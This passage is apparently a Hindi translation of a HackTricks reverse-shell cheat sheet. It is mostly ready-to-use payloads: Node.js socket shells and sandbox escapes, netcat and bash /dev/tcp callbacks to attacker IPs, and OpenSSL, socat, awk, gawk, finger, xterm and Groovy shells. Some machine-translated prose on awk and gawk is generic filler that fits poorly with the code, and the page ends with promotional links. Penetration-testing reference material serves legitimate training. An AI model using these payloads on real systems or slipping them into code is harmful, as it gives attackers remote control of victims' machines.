शेल सत्र शुरू होने के बाद, आप नोडजेएस एप्लिकेशन के लिए विभिन्न कार्रवाइयों को कर सकते हैं। आप शेल में नोडजेएस कोड लिख सकते हैं और उसे प्रोसेस कर सकते हैं। इसके अलावा, आप शेल में नोडजेएस एप्लिकेशन के लिए विभिन्न मॉड्यूल्स को लोड कर सकते हैं और उन्हें उपयोग कर सकते हैं।

शेल सत्र से बाहर निकलने के लिए, आप `Ctrl + C` को दबा सकते हैं।
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

आक्रमक (काली)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
शिकारी
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### बाइंड शेल
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### रिवर्स शेल

एक रिवर्स शेल एक हैकर को एक दूसरे सिस्टम में दूरस्थ रूप से एक कमांड इंटरप्रिटर का उपयोग करने की अनुमति देता है। यह एक प्रकार का शेल बैकडोर होता है जो एक नियंत्रित सर्वर के साथ संचार स्थापित करता है। रिवर्स शेल का उपयोग करके, हैकर दूसरे सिस्टम में दूरस्थ रूप से कमांड चला सकता है, फ़ाइलें अपलोड और डाउनलोड कर सकता है, प्रोसेस को नियंत्रित कर सकता है, और अन्य नेटवर्क कार्य कर सकता है।

एक रिवर्स शेल स्थापित करने के लिए, हैकर को एक शिकार के सिस्टम में एक शेल स्क्रिप्ट या एक एकल लाइन कमांड भेजनी होती है। जब शिकार इसे चलाता है, शेल स्क्रिप्ट या एकल लाइन कमांड एक नियंत्रित सर्वर के साथ संपर्क स्थापित करता है और एक रिवर्स शेल सत्र शुरू करता है। इसके बाद, हैकर दूसरे सिस्टम में दूरस्थ रूप से कमांड चला सकता है और उसके लिए नियंत्रण प्राप्त कर सकता है।

एक रिवर्स शेल स्थापित करने के लिए, कई तकनीकें उपयोग की जा सकती हैं, जैसे कि नेटकैट, नेटकैटएस, नेटकैटएसएल, नेटकैटएसएसएच, पायथन, और मेटास्प्लोइट। ये तकनीकें नियंत्रित सर्वर के साथ संपर्क स्थापित करने के लिए विभिन्न प्रोटोकॉल और तकनीकों का उपयोग करती हैं।

एक रिवर्स शेल का उपयोग करने के लिए, हैकर को नियंत्रित सर्वर को स्थापित करने के लिए एक वेबसाइट या एक अन्य संचार साधन की आवश्यकता होती है। इसके बाद, हैकर शिकार के सिस्टम में रिवर्स शेल स्थापित करने के लिए एक शेल स्क्रिप्ट या एक एकल लाइन कमांड भेजता है। शिकार इसे चलाता है और नियंत्रित सर्वर के साथ संपर्क स्थापित करता है, जिससे रिवर्स शेल सत्र शुरू होता है। इसके बाद, हैकर दूसरे सिस्टम में दूरस्थ रूप से कमांड चला सकता है और उसके लिए नियंत्रण प्राप्त कर सकता है।
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## आव्क

Awk एक शेल स्क्रिप्टिंग भाषा है जिसे लिनक्स पर उपयोग किया जाता है। यह एक पावरफुल टूल है जो टेक्स्ट डेटा को प्रोसेस करने और मैनिपुलेट करने की क्षमता प्रदान करता है। Awk का उपयोग डेटा फ़ाइलों को खोजने, पैटर्न मिलान करने, डेटा को फ़ॉर्मेट करने, रिपोर्ट बनाने और अन्य कार्यों के लिए किया जाता है।

Awk का उपयोग करने के लिए, आपको एक या एक से अधिक फ़ाइलों को देखने के लिए एक पैटर्न और एक एक्शन निर्दिष्ट करना होगा। पैटर्न फ़ाइल के लिए एक मिलान करने वाली शर्त होती है, जबकि एक्शन उस फ़ाइल पर कार्रवाई का निर्देश देता है। Awk फ़ाइल को पढ़ता है, प्रत्येक पंक्ति को पैटर्न के साथ मिलान करता है और उस पंक्ति के लिए निर्दिष्ट एक्शन को चलाता है।

यहां कुछ उदाहरण हैं जो आपको Awk का उपयोग करने के तरीके को समझने में मदद करेंगे:

### उदाहरण 1: फ़ाइल से डेटा पढ़ें

```bash
awk '{print $1}' file.txt
```

इस उदाहरण में, हम फ़ाइल `file.txt` को पढ़ रहे हैं और प्रत्येक पंक्ति के पहले शब्द को प्रिंट कर रहे हैं।

### उदाहरण 2: पैटर्न के आधार पर फ़ाइल फ़िल्टर करें

```bash
awk '/pattern/' file.txt
```

इस उदाहरण में, हम फ़ाइल `file.txt` को पढ़ रहे हैं और प्रत्येक पंक्ति को पैटर्न के साथ मिलान कर रहे हैं। केवल मिलान होने वाली पंक्तियों को प्रिंट किया जाएगा।

### उदाहरण 3: फ़ाइल में गणना करें

```bash
awk '{sum += $1} END {print sum}' file.txt
```

इस उदाहरण में, हम फ़ाइल `file.txt` को पढ़ रहे हैं और प्रत्येक पंक्ति के पहले शब्द को जोड़कर गणना कर रहे हैं। अंत में, हम गणना का परिणाम प्रिंट कर रहे हैं।

Awk एक शक्तिशाली टूल है जो टेक्स्ट डेटा को प्रोसेस करने के लिए उपयोगी हो सकता है। इसके विभिन्न फ़ंक्शन और संदर्भों का उपयोग करके, आप अपनी आवश्यकताओं के अनुसार डेटा को मैनिपुलेट कर सकते हैं।
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
आक्रमणकारी
```bash
while true; do nc -l 79; done
```
इस कमांड को भेजने के लिए इसे लिखें, एंटर दबाएं और CTRL+D दबाएं (STDIN को रोकने के लिए)

**पीड़ित**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## गॉक

Gawk एक शेल स्क्रिप्टिंग और पैटर्न मैचिंग भाषा है जो लिनक्स पर उपयोग होती है। यह एक शक्तिशाली टूल है जो टेक्स्ट फ़ाइलों को पाठने, संपादित करने और प्रसंस्करण करने की क्षमता प्रदान करता है। Gawk का उपयोग डेटा मानियों को व्यवस्थित करने, फ़ाइलों को फ़ॉर्मेट करने, और रिपोर्ट बनाने के लिए किया जा सकता है।

Gawk के बहुत सारे उपयोग हो सकते हैं, जैसे कि डेटा मानियों को फ़िल्टर करना, डेटा को ट्रांसफ़ॉर्म करना, और डेटा को संकलित करना। यह एक विशेष भाषा है जिसमें आप पैटर्न मैचिंग, वेरिएबल्स, और फ़ंक्शन्स का उपयोग करके टेक्स्ट फ़ाइलों को प्रोसेस कर सकते हैं।

Gawk का उपयोग करके, आप टेक्स्ट फ़ाइलों को लाइन द्वारा पढ़ सकते हैं, लाइनों को फ़िल्टर कर सकते हैं, और लाइनों को ट्रांसफ़ॉर्म कर सकते हैं। आप इसे अन्य शेल स्क्रिप्टिंग भाषाओं के साथ भी उपयोग कर सकते हैं, जैसे कि बैश और पावरशेल।

Gawk का उपयोग करने के लिए, आपको इसे अपने लिनक्स सिस्टम पर स्थापित करना होगा। आप गॉक को टर्मिनल में चला सकते हैं और टेक्स्ट फ़ाइलों को प्रोसेस करने के लिए गॉक स्क्रिप्ट बना सकते हैं। गॉक स्क्रिप्ट को चलाने के लिए, आपको टर्मिनल में `gawk -f script.awk file.txt` टाइप करना होगा, जहां `script.awk` आपका गॉक स्क्रिप्ट फ़ाइल है और `file.txt` आपकी इनपुट फ़ाइल है।
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

एक सरल प्रकार का रिवर्स शेल एक्सटर्म सेशन है। निम्नलिखित कमांड सर्वर पर चलाई जानी चाहिए। यह आपके पास वापस कनेक्ट होने की कोशिश करेगा (10.0.0.1) TCP पोर्ट 6001 पर।
```bash
xterm -display 10.0.0.1:1
```
आने वाले xterm को पकड़ने के लिए, एक X-Server शुरू करें (:1 - जो TCP पोर्ट 6001 पर सुनता है)। इसे करने का एक तरीका Xnest के साथ है (जो आपके सिस्टम पर चलाया जाएगा):
```bash
Xnest :1
```
आपको लक्ष्य को आपसे कनेक्ट करने के लिए अधिकृत करने की आवश्यकता होगी (यह आपके होस्ट पर भी चलाया जाने वाला कमांड है):
```bash
xhost +targetip
```
## ग्रूवी

द्वारा [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) नोट: जावा रिवर्स शेल ग्रूवी के लिए भी काम करता है।
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## प्रमाणपत्र

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता जो महत्वपूर्ण हैं उन दुर्बलताओं को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमला सतह को ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याएं खोजता है। [**इसे आज़माएं मुफ़्त में**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
